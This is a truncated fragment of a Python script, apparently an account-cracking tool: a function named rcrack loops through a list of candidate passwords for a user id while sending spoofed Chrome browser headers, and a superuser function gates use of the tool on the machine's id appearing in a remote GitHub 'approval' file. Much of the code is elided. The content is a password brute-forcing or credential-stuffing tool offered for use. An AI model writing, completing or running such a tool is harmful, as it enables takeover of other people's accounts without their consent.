...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5839.213", "Google Chrome";v="116.0.5839.213"',
            'sec-ch-ua-mobile': '?0',
            ...
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5839.213 Safari/537.36',
            'viewport-width': '980',
}
...
def superuser():
    ...
    id = "71".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/Coxsakib/EHC-SAKIB1/edit/main/Aprovale1.txt").text
    if id in DARK:
        os.system('clear')
        print(logo)
        xxr()
